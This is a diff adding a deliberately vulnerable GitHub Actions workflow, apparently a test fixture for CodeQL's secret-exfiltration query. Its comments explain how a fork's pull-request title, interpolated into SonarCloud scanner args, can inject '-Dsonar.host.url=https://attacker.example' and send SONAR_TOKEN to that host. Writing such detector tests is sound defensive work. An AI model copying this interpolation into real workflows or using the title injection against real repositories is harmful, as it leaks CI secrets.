@@ -1,0 +1,26 @@
+# situation: the test of CodeQL's actions/secret-exfiltration: on
+#   pull_request_target, the scan of SonarSource's action gets the pull
+#   request's title in args, with SONAR_TOKEN in env.
+# reason: the action splits args into the arguments of the scanner, so the
+#   title can add -Dsonar.host.url=, which the scanner reads after env and
+#   sends SONAR_TOKEN to.
+# attack: the author of a pull request from a fork titles the pull request x
+#   -Dsonar.host.url=https://attacker.example.
+# attack-run-behavior: the scanner takes https://attacker.example as the
+#   server and sends its requests there with Authorization: Bearer and the
+#   value of SONAR_TOKEN.
+name: test
+on:
+  pull_request_target:
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: sonarsource/sonarcloud-github-action@master
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
+        with:
+          args: >
+            -Dsonar.scm.revision=${{ github.event.workflow_run.head_sha }}
+            -Dsonar.pullrequest.key=${{ github.event.pull_request.title }}
